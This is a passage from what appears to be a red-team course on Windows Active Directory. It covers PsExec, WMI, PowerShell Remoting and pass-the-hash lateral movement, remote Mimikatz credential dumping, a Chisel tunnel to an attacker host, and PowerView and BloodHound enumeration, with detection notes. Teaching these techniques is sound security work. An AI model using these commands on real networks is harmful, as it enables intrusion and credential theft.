(Test-Connection -ComputerName $ip -Count 1 -ErrorAction SilentlyContinue) {\r\n        Write-Host \"$ip is Online\"\r\n    }\r\n}\r\n\r\n# Check for open RDP ports (3389) on potential targets\r\n# Requires ability to make outbound connections\r\n$potentialTargets = @(\"192.168.1.10\", \"192.168.1.11\", \"ServerA.domain.local\") # Example list\r\nforeach ($target in $potentialTargets) {\r\n    try {\r\n        $socket = New-Object System.Net.Sockets.TcpClient($target, 3389)\r\n        Write-Host \"$target has RDP port 3389 open\"\r\n        $socket.Close()\r\n    } catch {\r\n        # Port is likely closed or host is down\r\n    }\r\n}\r\n\r\n# Similarly, check for SMB (445), WinRM (5985/5986), RPC (135)\r\n```\r\n\r\n##### **4.2 Leveraging Harvested Credentials for Lateral Movement**\r\n\r\nThis is the engine that drives most lateral movement within a Windows domain. The credentials you harvested in Module 2 (or will harvest later) are gold.\r\n\r\n*   **Types of Credentials:**\r\n    *   **Plaintext Passwords:** The most valuable. Can be used for any authentication method.\r\n    *   **NTLM Hashes:** Can be used directly for authentication via techniques like Pass-the-Hash (PtH) against services using NTLM authentication (like SMB).\r\n    *   **Kerberos Tickets:** Can be reused or forged via techniques like Pass-the-Ticket (PtT) or Overpass-the-Hash (OpH).\r\n    *   **Cached Credentials:** Stored by the OS.\r\n    *   **Saved Credentials:** Stored in Credential Manager or configuration files.\r\n\r\n*   **How they enable LM:** Many remote administration tools and protocols (PsExec, WMI, RDP, PowerShell Remoting, SMB) support authentication using usernames/passwords or hashes/tickets. If you have valid credentials for an account that has permissions on a target machine, you can use these tools to authenticate and execute code or access resources remotely.\r\n\r\n*   **Note:** We will have a *deep dive* into the specifics of NTLM, Kerberos, Pass-the-Hash, Pass-the-Ticket, and Overpass-the-Hash in **Module 6**. For now, understand that having a user's password or hash *allows* you to use the techniques described below to authenticate to other machines *as that user*.\r\n\r\n##### **4.3 Lateral Movement using Native Windows Tools**\r\n\r\nThese techniques leverage built-in Windows features and protocols. They are powerful because they often don't require uploading custom binaries (though helper scripts or tools are common), can sometimes blend in with normal network traffic, and rely on functionality that is often enabled by default for legitimate administration.\r\n\r\nLet's break down the most common and effective ones:\r\n\r\n###### **4.3.1 PsExec and its Variants**\r\n\r\n*   **Concept:** PsExec (part of Sysinternals, now Microsoft) allows you to execute processes on other systems. It's widely used by administrators, making its traffic potentially less suspicious than custom malware.\r\n*   **How it Works:** PsExec typically works by installing a temporary Windows Service (`PSEXESVC`) on the target machine. This service then executes the command you specify and sends the output back. It authenticates using the credentials of the user running PsExec or explicitly provided credentials.\r\n*   **Pros:**\r\n    *   Simple to use.\r\n    *   Requires no client-side installation on the target (except the temporary service).\r\n    *   Effective for executing commands or launching shells remotely.\r\n    *   Commonly used by IT, potentially blending in.\r\n*   **Cons:**\r\n    *   Requires administrative privileges on the target machine.\r\n    *   Creates a service (`PSEXESVC`), which is a common detection artifact.\r\n    *   Can be blocked by endpoint security solutions.\r\n    *   Relies on SMB (ports 139/445) and RPC (port 135).\r\n*   **Usage:**\r\n    *   **Using current user's credentials (if admin on target):**\r\n        ```cmd\r\n        PsExec.exe \\\\<target_ip_or_hostname> <command_to_execute>\r\n        # Example: Execute cmd.exe on Server01\r\n        PsExec.exe \\\\Server01 cmd.exe\r\n        # This will open an interactive command shell on Server01\r\n        ```\r\n    *   **Using explicit credentials:**\r\n        ```cmd\r\n        PsExec.exe \\\\<target_ip_or_hostname> -u <domain>\\<username> -p <password> <command_to_execute>\r\n        # Example: Execute whoami as domain\\administrator on 192.168.1.20\r\n        PsExec.exe \\\\192.168.1.20 -u domain\\administrator -p 'MySecretPwd123!' whoami\r\n        ```\r\n    *   **Running as SYSTEM:** The `-s` flag runs the process in the SYSTEM account's security context. The `-h` flag (Windows Vista and later) runs the process with the account's elevated token, often bypassing UAC prompts on the target if the user is in the Administrators group.\r\n        ```cmd\r\n        PsExec.exe \\\\<target_ip> -s cmd.exe\r\n        PsExec.exe \\\\<target_ip> -h cmd.exe\r\n        ```\r\n    *   **Executing a program with arguments:**\r\n        ```cmd\r\n        PsExec.exe \\\\<target_ip> -u <user> -p <pass> \"C:\\Path\\To\\Program.exe\" arg1 arg2\r\n        ```\r\n    *   **Copying a file and executing it:**\r\n        ```cmd\r\n        PsExec.exe \\\\<target_ip> -c <local_file_to_copy> <command_to_execute_copied_file>\r\n        # Example: Copy evil.exe and run it\r\n        PsExec.exe \\\\192.168.1.20 -u domain\\user -p pass -c evil.exe evil.exe\r\n        ```\r\n\r\n*   **Detection:** Look for `PSEXESVC` service creation and deletion events (Event ID 7036 in System log), remote process creation events (Event ID 4688 with `PSEXESVC` as parent, or Sysmon Event ID 1), and network traffic patterns indicative of SMB/RPC service installation and command execution.\r\n\r\n###### **4.3.2 Windows Management Instrumentation (WMI)**\r\n\r\n*   **Concept:** WMI is a powerful interface for managing Windows systems, both locally and remotely. It allows querying system information, executing methods (including creating processes), and receiving event notifications.\r\n*   **How it Works:** WMI uses DCOM (Distributed Component Object Model) over RPC (port 135) initially, then negotiates ports for the actual data transfer. It can also operate over WinRM (ports 5985/5986). It authenticates using standard Windows methods (NTLM/Kerberos).\r\n*   **Pros:**\r\n    *   Native to Windows.\r\n    *   Extremely flexible for both enumeration and execution.\r\n    *   Often allowed by firewalls for management purposes.\r\n    *   Less noisy than PsExec's service creation (though remote process creation is still detectable).\r\n*   **Cons:**\r\n    *   Syntax can be complex (`wmic`, WMI Query Language - WQL).\r\n    *   Requires administrative privileges on the target for most offensive actions (like process creation).\r\n    *   Firewall rules might restrict DCOM/RPC traffic.\r\n*   **Usage (PowerShell):**\r\n    *   **Executing a command/process:**\r\n        ```powershell\r\n        # Using Invoke-WmiMethod (newer PowerShell)\r\n        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"cmd.exe /c ipconfig > C:\\temp\\ipconfig_target.txt\" -ComputerName <target_ip_or_hostname> -Credential (Get-Credential) # Prompts for credentials\r\n        # Or pass credentials directly (less secure in scripts, better for interactive)\r\n        $pass = ConvertTo-SecureString 'MySecretPwd123!' -AsPlainText -Force\r\n        $cred = New-Object System.Management.Automation.PSCredential 'domain\\user', $pass\r\n        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"cmd.exe /c whoami > C:\\temp\\whoami_target.txt\" -ComputerName <target_ip> -Credential $cred\r\n\r\n        # Using Get-WmiObject (older PowerShell)\r\n        (Get-WmiObject win32_process -computername <target_ip> -credential $cred).create(\"cmd /c calc.exe\")\r\n        ```\r\n    *   **Enumeration (useful for recon from a distance):**\r\n        ```powershell\r\n        Get-WmiObject -Class Win32_OperatingSystem -ComputerName <target_ip> -Credential $cred\r\n        Get-WmiObject -Class Win32_Service -ComputerName <target_ip> -Credential $cred | Where-Object {$_.StartMode -eq 'Auto'}\r\n        ```\r\n*   **Usage (wmic command - from CMD):**\r\n    *   **Executing a process:**\r\n        ```cmd\r\n        wmic /node:<target_ip> /user:\"<domain>\\<user>\" /password:\"<password>\" process call create \"cmd.exe /c whoami > C:\\temp\\whoami_target_wmic.txt\"\r\n        ```\r\n    *   **Enumeration:**\r\n        ```cmd\r\n        wmic /node:<target_ip> /user:\"<domain>\\<user>\" /password:\"<password>\" os get Caption,CSDVersion,OSArchitecture /format:list\r\n        wmic /node:<target_ip> /user:\"<domain>\\<user>\" /password:\"<password>\" service get Name,State /format:list\r\n        ```\r\n*   **Usage (Impacket's `wmiexec.py`):** A popular Python tool for WMI execution, often used from Linux/Kali.\r\n    ```bash\r\n    # Using password\r\n    wmiexec.py <domain>/<user>:'<password>'@<target_ip> 'whoami'\r\n    # Using NTLM hash (requires hash obtained previously)\r\n    wmiexec.py <domain>/<user>@<target_ip> -hashes :<ntlm_hash> 'ipconfig'\r\n    ```\r\n\r\n*   **Detection:** Look for remote WMI activity (often logged on the target, Sysmon Event ID 21 for WMI event consumers, Event ID 4624/4625 for remote logins, remote process creation Event ID 4688/Sysmon ID 1 initiated by WMI processes like `WmiPrvse.exe`).\r\n\r\n###### **4.3.3 Remote Desktop Protocol (RDP)**\r\n\r\n*   **Concept:** RDP provides a graphical interface to a remote machine. If RDP is enabled and you have credentials for a user allowed to log in via RDP (typically users in the Remote Desktop Users group or Administrators), you can establish a full interactive session.\r\n*   **How it Works:** RDP uses port 3389 (default) and establishes a direct graphical session. Authentication uses standard Windows methods.\r\n*   **Pros:**\r\n    *   Full interactive access.\r\n    *   Easy to navigate and use the target system.\r\n    *   Commonly used by administrators.\r\n*   **Cons:**\r\n    *   Requires RDP service to be enabled on the target.\r\n    *   Requires credentials for a user permitted to RDP.\r\n    *   Creates an interactive logon session, which is highly visible in logs (Event ID 4624 Logon Type 10).\r\n    *   Firewalls might block port 3389.\r\n*   **Usage:**\r\n    *   **Native RDP Client (mstsc.exe):**\r\n        ```cmd\r\n        mstsc /v:<target_ip_or_hostname>\r\n        # You will be prompted for credentials.\r\n        # To pre-fill username (password still prompted):\r\n        mstsc /v:<target_ip> /u:<domain>\\<user>\r\n        ```\r\n    *   **Using saved RDP credentials:** If the user on your current host has saved RDP credentials for the target, `mstsc` might use them automatically.\r\n    *   **Tools that automate RDP login:** Some C2 frameworks or specialized tools can automate RDP logins using harvested credentials.\r\n\r\n*   **Detection:** Look for interactive logon events (Event ID 4624 Logon Type 10) on the target machine, RDP session connect/disconnect events, and network traffic on port 3389.\r\n\r\n###### **4.3.4 PowerShell Remoting (PSRemoting)**\r\n\r\n*   **Concept:** PSRemoting allows executing PowerShell commands and scripts on remote computers. It's the preferred method for remote administration in modern Windows environments.\r\n*   **How it Works:** PSRemoting uses the WS-Management protocol (WinRM listener) typically over HTTP (port 5985) or HTTPS (port 5986). It uses standard Windows authentication. It needs to be enabled on the target machine (`Enable-PSRemoting`).\r\n*   **Pros:**\r\n    *   Powerful and flexible for complex tasks and scripting.\r\n    *   Native to PowerShell, integrates well with other cmdlets.\r\n    *   Can be more firewall-friendly than DCOM/RPC depending on configuration.\r\n    *   Often enabled in modern server environments.\r\n*   **Cons:**\r\n    *   Requires PSRemoting to be enabled on the target.\r\n    *   Requires credentials for a user with remote execution rights (often Administrators).\r\n    *   Firewalls might block ports 5985/5986.\r\n*   **Usage:**\r\n    *   **Entering an interactive session:**\r\n        ```powershell\r\n        Enter-PSSession -ComputerName <target_ip_or_hostname> -Credential (Get-Credential) # Prompts\r\n        # Using explicit credentials:\r\n        $pass = ConvertTo-SecureString 'MySecretPwd123!' -AsPlainText -Force\r\n        $cred = New-Object System.Management.Automation.PSCredential 'domain\\user', $pass\r\n        Enter-PSSession -ComputerName <target_ip> -Credential $cred\r\n        # Once inside the session, the prompt changes, e.g., [target_ip]: PS>\r\n        # You can run PowerShell commands directly on the target. Type 'Exit-PSSession' to leave.\r\n        ```\r\n    *   **Running a single command or script block:**\r\n        ```powershell\r\n        Invoke-Command -ComputerName <target_ip> -ScriptBlock { <command_to_execute> } -Credential $cred\r\n        # Example:\r\n        Invoke-Command -ComputerName 192.168.1.20 -ScriptBlock { Get-Process explorer } -Credential $cred\r\n        Invoke-Command -ComputerName 192.168.1.20 -ScriptBlock { ipconfig /all > C:\\temp\\ipconfig_psremoting.txt } -Credential $cred\r\n        ```\r\n    *   **Using PowerShell scripts/modules remotely:** Many post-exploitation frameworks and scripts (like PowerSploit's `PowerView` or `Invoke-Mimikatz`) are designed to be run via `Invoke-Command` or within a remote session.\r\n        ```powershell\r\n        # Example: Run Invoke-Mimikatz remotely (assuming it's loaded in the remote session or dot-sourced)\r\n        Invoke-Command -ComputerName 192.168.1.20 -ScriptBlock { Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"' } -Credential $cred\r\n        ```\r\n\r\n*   **Detection:** Look for WinRM activity (Event ID 4624/4625 for network logins, Event ID 4100/4104 for PowerShell script block logging, Event ID 4688/Sysmon ID 1 for remote process creation initiated via WinRM, network traffic on ports 5985/5986).\r\n\r\n##### **4.4 Session Reuse and Leveraging Existing Authenticated Sessions**\r\n\r\n*   **Concept:** Sometimes, you don't need to explicitly provide credentials for a lateral move. If the user you are currently acting as on the compromised host already has an authenticated session or cached credentials that are valid on the target machine, you might be able to leverage that existing context.\r\n*   **How it Works:** When a user authenticates to a domain resource (like a file share, a web server, etc.), the Windows LSA (Local Security Authority) caches credentials or obtains Kerberos tickets. Subsequent attempts to access *other* resources *as the same user* might automatically use these cached credentials or tickets without prompting for a password again.\r\n*   **Practical Application:**\r\n    *   If you compromise a machine where a Domain Admin is currently logged in, you might be able to use tools that operate in the context of the *logged-in user's* session to access other resources they have permissions for.\r\n    *   Tools like `runas /netonly` can simulate logging in as a different user specifically for network resource access *without* changing the current user on the local machine. This is useful if you have credentials but don't want to PE on the current machine yet or can't inject into a process.\r\n        ```cmd\r\n        # Example: Run cmd.exe as domain\\admin, but only for network access\r\n        runas /netonly /user:domain\\admin cmd.exe\r\n        # A new CMD window opens. Inside this window, try accessing a share only admin can access:\r\n        # net use \\\\<target_ip>\\C$\r\n        # dir \\\\<target_ip>\\C$\r\n        ```\r\n    *   Leveraging Kerberos ticket caches (covered more in M6 with Pass-the-Ticket). If you can extract a user's TGT (Ticket Granting Ticket), you can inject it into a session on *another* machine and potentially access resources as that user.\r\n\r\n*   **OpSec Note:** Using `runas /netonly` or similar techniques might still generate logon events on the target resource, but the logon type might be different (e.g., Network cleartext, Logon Type 3) compared to an interactive RDP logon (Logon Type 10).\r\n\r\n##### **4.5 Pivoting and Tunneling**\r\n\r\n*   **Concept:** Pivoting (or relaying) and tunneling are techniques used to route network traffic through a compromised host to reach other systems or networks that are not directly accessible from the attacker's machine.\r\n*   **How it Works:**\r\n    *   **Pivoting:** The compromised host acts as a relay. Attack traffic is sent to the compromised host, which then forwards it to the intended target deeper in the network. Tools like Metasploit's `autoroute` or `socks4a` modules, or frameworks like Covenant, have built-in pivoting capabilities.\r\n    *   **Tunneling:** Creates a secure channel (like an SSH tunnel, or tunnels created by tools like Chisel, Earthworm, etc.) through the compromised host. Traffic is encapsulated and sent through this tunnel. This can be used to access specific ports or even entire networks.\r\n*   **Why use it?**\r\n    *   To bypass network segmentation and firewalls.\r\n    *   To access systems on isolated subnets.\r\n    *   To obscure the true origin of the attack traffic.\r\n*   **Usage:**\r\n    *   This is often integrated into C2 frameworks.\r\n    *   Manual methods involve setting up port forwards or SOCKS proxies on the compromised host.\r\n    *   **Example (using Chisel):**\r\n        *   Run Chisel server on attacker machine: `chisel server -p 8000 --socks5`\r\n        *   Upload Chisel client to compromised host.\r\n        *   Run Chisel client on compromised host: `chisel client <attacker_ip>:8000 R:socks5`\r\n        *   Now, configure tools on attacker machine to use a SOCKS5 proxy pointing to `localhost:1080` (or whatever the client forwarded), and their traffic will be routed through the compromised host.\r\n\r\n*   **Note:** Full network pivoting and tunneling is a complex topic often covered in more advanced modules or specialized courses. For the scope of this course on AD red teaming, understand the *concept* that if a target isn't directly reachable, a compromised host *within* that network can act as a stepping stone. We will focus primarily on the *techniques for execution once you *can* reach the target host* using credentials.\r\n\r\n##### **4.6 OpSec Considerations for Lateral Movement**\r\n\r\nLateral movement is inherently noisy compared to initial reconnaissance on a single host. You are interacting with multiple systems across the network, generating logs and network traffic.\r\n\r\n*   **What Defenders See:**\r\n    *   **Authentication Logs:** Successful and failed login attempts on target machines (Event ID 4624/4625). Logon Type 3 (Network) is common for PsExec, WMI, SMB access. Logon Type 10 (RemoteInteractive) for RDP.\r\n    *   **Process Creation Logs:** Remote execution techniques like PsExec, WMI, and PSRemoting result in new processes being created on the target machine (Event ID 4688, Sysmon Event ID 1). Look for unusual parent-child relationships (e.g., `wmiprvse.exe` or `PSEXESVC.exe` launching `cmd.exe` or `powershell.exe`).\r\n    *   **Service Creation Logs:** PsExec creates the `PSEXESVC` service (Event ID 7036).\r\n    *   **Network Traffic:** Specific ports being accessed (135, 139, 44"
    },
    {
      "title": "module_5",
      "description": "module_5 Overview",
      "order": 5,
      "content": "Alright team, buckle up! We've spent the last few modules getting cozy on a single Windows host, digging through its secrets, and figuring out how to become its local king or queen. But let's be real ‚Äì the real treasure in most corporate environments isn't just on one machine; it's spread across the domain. And the keys to the kingdom? They usually reside in Active Directory.\r\n\r\nThis is where the game changes. We're moving from a single-player scenario to understanding the entire network ecosystem. Module 5 is all about becoming master cartographers of the Active Directory forest, mapping out the paths that lead to the most valuable targets. This isn't just about running a few commands; it's about building a comprehensive picture of the domain's structure, users, groups, computers, and critically, the *relationships* between them.\r\n\r\nThink of AD enumeration as gathering intelligence, and attack path mapping as turning that intelligence into a strategic plan. Without this step, you're just blindly poking around. With it, you're efficiently identifying the weakest links and the most direct routes to your objectives.\r\n\r\nLet's dive in and learn how to see the forest *and* the trees!\r\n\r\n---\r\n\r\n## **Module 5: Active Directory Enumeration & Attack Path Mapping**\r\n\r\n**Module Objective:** Conduct comprehensive reconnaissance of an Active Directory environment to identify users, groups, computers, trusts, GPOs, and map potential attack paths to high-value targets like Domain Admins. By the end of this module, you'll be able to use native tools, PowerShell, and BloodHound to understand the structure and relationships within an AD domain and identify promising attack vectors.\r\n\r\n**Target State:** From a compromised domain-joined host (simulating initial access from previous modules), you can enumerate key AD objects and their relationships, load this data into a graph database tool, and query it to find potential attack paths towards sensitive targets.\r\n\r\n---\r\n\r\n### **5.1 Introduction to Active Directory Concepts (Refresher)**\r\n\r\nBefore we start poking around, let's quickly ground ourselves in the fundamentals. Even if you've worked with AD before, a red teamer's perspective is slightly different ‚Äì we care about how these components create potential security weaknesses.\r\n\r\n*   **Domain Controller (DC):** The heart of the domain. Holds the Active Directory database (NTDS.DIT), authenticates users, enforces security policies. Compromising a DC often means domain dominance.\r\n*   **Forest:** A collection of one or more domains that share a common schema, configuration, and global catalog. Domains within a forest trust each other transitively by default.\r\n*   **Trusts:** Relationships between domains or forests that allow users in one domain to access resources in another. Can be transitive (flows through) or non-transitive, one-way or two-way. A trust is a potential lateral movement path *across* domain boundaries.\r\n*   **Organizational Units (OUs):** Containers within a domain used to organize users, groups, computers, and other OUs. OUs are key for applying Group Policy.\r\n*   **Group Policy Objects (GPOs):** Collections of settings that control the working environment of user and computer accounts. Applied to Sites, Domains, or OUs. GPOs are powerful for enforcing security, but misconfigured GPOs (e.g., containing credentials, applying insecure settings) can be a major weakness.\r\n*   **Users & Groups:** The principals and collections of principals within the domain. We're particularly interested in privileged groups (Domain Admins, Enterprise Admins, Schema Admins, Account Operators, Backup Operators, etc.) and users who are members of these groups, or users with specific attributes that make them vulnerable (e.g., SPNs, weak passwords, 'Do not require Kerberos preauthentication').\r\n*   **Computers:** Workstations and servers joined to the domain. Computers also have accounts in AD. Their local group memberships (especially local Administrators) and authenticated sessions are critical for lateral movement.\r\n\r\n**Red Team Focus:** We're looking for *relationships* and *misconfigurations*. Who is a local admin on which machine? Which users are in which privileged groups? Which computers have which users logged in? Which GPOs apply where and contain what? Where do trusts exist? These connections form the graph we want to exploit.\r\n\r\n---\r\n\r\n### **5.2 Native Command-Line Tools for AD Enumeration**\r\n\r\nWhy start with native tools? Because they are *always* there on a Windows machine (unless heavily crippled), they don't require bringing external executables (potentially triggering AV/EDR), and they are often less suspicious than powerful PowerShell scripts or dedicated tools if used carefully. They can be slow and noisy for large domains, but they are fundamental.\r\n\r\nMake sure you execute these commands from a domain-joined machine, ideally with credentials that have at least standard domain user privileges.\r\n\r\n**Essential Native Commands:**\r\n\r\n1.  **Identifying the Domain and Domain Controller:**\r\n    *   `systeminfo | findstr /B /C:\"Domain:\" /C:\"Logon Server:\"`\r\n        *   Finds the joined domain and the DC used for login.\r\n    *   `ipconfig /all | findstr \"Primary Dns Suffix\"`\r\n        *   Another way to find the domain name.\r\n    *   `nltest /domain_trusts`\r\n        *   Lists domain trusts (if any) for the current domain. Requires elevated privileges sometimes.\r\n    *   `nltest /dclist:<DomainName>`\r\n        *   Lists domain controllers for a specific domain.\r\n        *   *Example:* `nltest /dclist:corp.local`\r\n\r\n2.  **Enumerating Domain Users:**\r\n    *   `net user /domain`\r\n        *   Lists all user accounts in the domain. Basic, but effective.\r\n    *   `dsquery user -limit 0`\r\n        *   More flexible. `-limit 0` means no limit (get all users).\r\n        *   *Example:* `dsquery user -limit 0 | more` (pipe to `more` if list is long)\r\n    *   `dsquery user -name \"Admin*\"`\r\n        *   Finds users whose name starts with \"Admin\".\r\n    *   `dsget user <UserDN> -display -memberof`\r\n        *   Gets details about a specific user and their group memberships. You'd need the Distinguished Name (DN) from `dsquery`.\r\n        *   *Example:* `dsquery user -samid \"johndoe\" | dsget user -display -memberof`\r\n\r\n3.  **Enumerating Domain Groups:**\r\n    *   `net group /domain`\r\n        *   Lists all global and domain local groups in the domain.\r\n    *   `net group \"<GroupName>\" /domain`\r\n        *   Lists members of a specific domain group. Very useful for finding members of privileged groups.\r\n        *   *Example:* `net group \"Domain Admins\" /domain`\r\n        *   *Example:* `net group \"Enterprise Admins\" /domain`\r\n        *   *Example:* `net group \"Administrators\" /domain` (This lists members of the *built-in* Administrators group in the domain, often containing Domain Admins)\r\n    *   `dsquery group -limit 0`\r\n        *   Lists all groups in the domain. More options for filtering than `net group`.\r\n    *   `dsget group <GroupDN> -members`\r\n        *   Lists members of a group using its DN.\r\n        *   *Example:* `dsquery group -name \"Domain Admins\" | dsget group -members`\r\n\r\n4.  **Enumerating Domain Computers:**\r\n    *   `net view /domain:<DomainName>`\r\n        *   Lists computers (servers and workstations) visible in the domain.\r\n        *   *Example:* `net view /domain:corp.local`\r\n    *   `dsquery computer -limit 0`\r\n        *   Lists all computer accounts in the domain.\r\n        *   *Example:* `dsquery computer -limit 0`\r\n\r\n5.  **Enumerating OUs:**\r\n    *   `dsquery ou -limit 0`\r\n        *   Lists all Organizational Units. Useful for understanding the domain's structure.\r\n\r\n**Pros of Native Tools:**\r\n*   Always available.\r\n*   Low risk of detection *by signature* (though command line logging can catch them).\r\n*   Good for quick checks if you know exactly what you're looking for.\r\n\r\n**Cons of Native Tools:**\r\n*   Limited functionality compared to PowerShell or dedicated tools.\r\n*   Output is often messy and difficult to parse programmatically.\r\n*   Can be very slow for large domains.\r\n*   Often requires specific syntax and DNs (`dsquery`/`dsget`).\r\n\r\n---\r\n\r\n### **5.3 Advanced AD Enumeration with PowerShell**\r\n\r\nPowerShell is your best friend for AD reconnaissance. It's flexible, powerful, and its output is structured, making it easy to filter, sort, and export data. The `ActiveDirectory` module (part of the Remote Server Administration Tools - RSAT) provides cmdlets specifically designed for interacting with AD. Even without RSAT installed, modules like `PowerView` can often perform similar actions by directly interacting with the LDAP protocol.\r\n\r\n**Using the `ActiveDirectory` Module:**\r\n\r\nIf RSAT is installed (often on administrative workstations or servers), you can import the module:\r\n\r\n```powershell\r\nImport-Module ActiveDirectory\r\n```\r\n\r\nNow you have access to cmdlets like `Get-ADUser`, `Get-ADGroup`, `Get-ADComputer`, `Get-ADDomain`, `Get-ADForest`, `Get-ADOrganizationalUnit`, `Get-ADServicePrincipalName`, etc.\r\n\r\n**Examples with `ActiveDirectory` Module:**\r\n\r\n```powershell\r\n# Get information about the domain\r\nGet-ADDomain\r\n\r\n# Get information about the forest\r\nGet-ADForest\r\n\r\n# List all users (first 10 for brevity, remove -ResultSetSize for all)\r\nGet-ADUser -Filter * -Properties SamAccountName -ResultSetSize 10 | Select-Object SamAccountName\r\n\r\n# Get details for a specific user\r\nGet-ADUser -Identity \"johndoe\" -Properties * # Use -Properties * to get all attributes\r\n\r\n# List all groups\r\nGet-ADGroup -Filter * | Select-Object Name\r\n\r\n# Get members of the \"Domain Admins\" group\r\nGet-ADGroupMember -Identity \"Domain Admins\"\r\n\r\n# List all computers\r\nGet-ADComputer -Filter * | Select-Object Name, OperatingSystem\r\n\r\n# Find computers where a specific user is a local administrator (requires checking local groups, more complex with just this module)\r\n# This requires iterating or using other techniques, PowerView simplifies this!\r\n\r\n# Find users whose password hasn't expired (potential service accounts)\r\nGet-ADUser -Filter 'PasswordExpired -eq $false' -Properties SamAccountName, PasswordNeverExpires\r\n\r\n# Find users with 'Do not require Kerberos preauthentication' enabled (AS-REP Roasting target)\r\nGet-ADUser -Filter 'UserAccountControl -band 0x400000' -Properties SamAccountName, UserPrincipalName\r\n\r\n# Find Service Principal Names (SPNs) - Kerberoasting targets\r\nGet-ADServicePrincipalName -Filter *\r\n# Or more specifically, users/computers with SPNs\r\nGet-ADUser -Filter 'ServicePrincipalNames -like \"*\"' -Properties SamAccountName, ServicePrincipalNames\r\nGet-ADComputer -Filter 'ServicePrincipalNames -like \"*\"' -Properties Name, ServicePrincipalNames\r\n```\r\n\r\n**Using `PowerView` (from PowerSploit/Deviance):**\r\n\r\n`PowerView` is a PowerShell script designed specifically for AD reconnaissance from an offensive perspective. It's often preferred because it consolidates many useful functions and can sometimes bypass execution restrictions more easily than importing a formal module.\r\n\r\nFirst, you need to get the `PowerView.ps1` script. You can often find it in red teaming frameworks (like Covenant, Empire, or standalone on GitHub).\r\n\r\n```powershell\r\n# Assuming you've downloaded PowerView.ps1 to the current directory\r\nImport-Module .\\PowerView.ps1 -Force # Use -Force if it was previously imported\r\n```\r\n\r\nNow you have access to functions like `Get-NetDomain`, `Get-NetUser`, `Get-NetGroup`, `Get-NetComputer`, `Get-NetGPO`, `Get-NetForestTrust`, `Find-LocalAdminAccess`, `Invoke-UserHunter`, `Invoke-ShareFinder`, etc.\r\n\r\n**Examples with `PowerView`:**\r\n\r\n```powershell\r\n# Get domain information\r\nGet-NetDomain\r\n\r\n# Get information about the domain controller\r\nGet-NetDomainController\r\n\r\n# List all domain users\r\nGet-NetUser\r\n\r\n# Get specific user details (including potentially useful attributes)\r\nGet-NetUser -UserName \"johndoe\" -Properties * # PowerView often gets more attributes by default\r\n\r\n# List all domain groups\r\nGet-NetGroup\r\n\r\n# Get members of a specific group\r\nGet-NetGroupMember -GroupName \"Domain Admins\"\r\n\r\n# Find all computers\r\nGet-NetComputer\r\n\r\n# Find computers where a specific user is a local administrator\r\nFind-LocalAdminAccess -UserName \"johndoe\" # Check where 'johndoe' has local admin rights\r\n\r\n# Find all users logged into domain computers (requires admin rights on target machines)\r\nInvoke-UserHunter\r\n\r\n# Find shares on domain computers\r\nInvoke-ShareFinder\r\n\r\n# List domain trusts\r\nGet-NetForestTrust\r\n\r\n# Find GPOs and their links\r\nGet-NetGPO\r\nGet-NetGPO -ComputerName <ComputerName> # Get GPOs applied to a specific computer\r\nGet-NetGPO -UserName <UserName> # Get GPOs applied to a specific user\r\n\r\n# Find users with SPNs (Kerberoasting targets!)\r\nGet-NetUser -SPN\r\n\r\n# Find users with 'Do not require Kerberos preauthentication' (AS-REP Roasting targets!)\r\nGet-NetUser -PreauthNotRequired\r\n\r\n# Find Kerberoastable users and output in crackable format (requires admin or specific privileges sometimes)\r\nGet-NetUser -SPN | Select-Object samaccountname, serviceprincipalname | Format-Table -AutoSize\r\n# For extraction, tools like Rubeus or Mimikatz are better (covered in M6)\r\n\r\n# Find computers/users with unconstrained delegation configured\r\nGet-NetDelegateStatus -Unconstrained\r\n\r\n# Find potential paths to Domain Admins (PowerView can do basic pathfinding, but BloodHound is superior)\r\nFind-DomainProcess -GroupName \"Domain Admins\" # Find processes run by DA members\r\nFind-DomainShare -GroupName \"Domain Admins\" # Find shares accessible by DA members\r\nFind-DomainController\r\n```\r\n\r\n**Pros of PowerShell/PowerView:**\r\n*   Much more flexible and powerful than native tools.\r\n*   Output is object-based, easy to filter, sort, and export.\r\n*   `PowerView` is designed for offensive recon and covers many common AD enumeration tasks efficiently.\r\n*   Leverages the .NET framework, often available on the system.\r\n\r\n**Cons of PowerShell/PowerView:**\r\n*   Requires PowerShell execution policies to allow script execution (can often be bypassed).\r\n*   Can generate more suspicious logs than native tools.\r\n*   Requires getting the script onto the target machine (though fileless execution is possible).\r\n\r\n**Pro Tip:** When doing extensive enumeration, save your results! Export to CSV or JSON for later analysis:\r\n`Get-NetUser | Export-Csv -Path C:\\Temp\\domain_users.csv -NoTypeInformation`\r\n\r\n---\r\n\r\n### **5.4 Why Attack Path Mapping? Introducing BloodHound**\r\n\r\nYou've run your commands, collected lists of users, groups, computers, and GPOs. You might even have some initial findings like \"User 'backup_admin' is a member of 'Backup Operators'\" or \"Computer 'SERVER01' has a lot of shares.\"\r\n\r\nBut how does this *connect*? How does knowing 'backup_admin' is in 'Backup Operators' help you get to 'Domain Admins'? Is 'backup_admin' a local admin on 'SERVER01'? Is a Domain Admin logged into 'SERVER01'? What if 'backup_admin' has a session on a workstation where a Domain Admin *also* has a session?\r\n\r\nActive Directory is a graph of relationships. Users are members of groups. Groups have permissions on resources. Users log into computers. Users are local administrators on computers. Users have control over OUs or GPOs. These relationships are complex and form potential *attack paths*.\r\n\r\nManually tracing these relationships across thousands of objects is nearly impossible. This is where **BloodHound** comes in.\r\n\r\n**BloodHound** is an open-source tool designed to reveal the hidden and often unintended relationships within an Active Directory environment. It uses graph theory to map these connections and identify highly complex attack paths that might otherwise go unnoticed.\r\n\r\n**BloodHound Components:**\r\n\r\n1.  **Collector:** Gathers data from the AD environment. The primary collectors are **SharpHound** (C#) and **PowerHound** (PowerShell). You run this on a compromised host within the domain.\r\n2.  **Database:** Stores the collected data in a graph format. BloodHound uses **Neo4j**, a popular graph database.\r\n3.  **GUI:** A graphical interface to interact with the database, visualize the relationships, and run built-in or custom queries to find attack paths.\r\n\r\n**The Power of the Graph:**\r\n\r\nBloodHound sees AD objects (Users, Groups, Computers, GPOs, OUs, Trusts) as *nodes* and the relationships between them (MemberOf, AdminTo, Session, HasSession, GenericAll, WriteDacl, etc.) as *edges*. By analyzing these edges, it can find paths like:\r\n\r\n*   User A -> MemberOf -> Group X -> AdminTo -> Computer Y -> HasSession -> User B -> MemberOf -> Domain Admins\r\n*   User C -> WriteDacl -> GPO Z -> LinksTo -> OU -> Contains -> Computer W -> LocalAdmin 